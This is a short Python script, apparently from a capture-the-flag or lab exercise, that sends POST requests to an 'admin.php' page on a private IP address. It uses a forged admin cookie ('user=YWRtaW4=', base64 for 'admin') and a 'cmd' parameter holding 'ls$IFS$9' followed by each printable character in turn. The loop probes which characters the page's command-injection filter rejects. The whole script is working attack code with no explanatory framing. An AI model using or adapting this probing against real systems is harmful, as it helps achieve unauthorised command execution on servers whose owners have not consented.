import requests
url = "http://10.51.0.10/admin.php"
head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Cookie":"PHPSESSID=p6fkav8edjmfm76eart4c9q104; user=YWRtaW4=",
}
for i in range(32,128,1):
    post_data={
        "cmd":"ls$IFS$9"+chr(i),
    }
    content = requests.post(url=url,headers=head,data=post_data)
    # print(content.text)
    if "error" in content.text:
        print(chr(i))
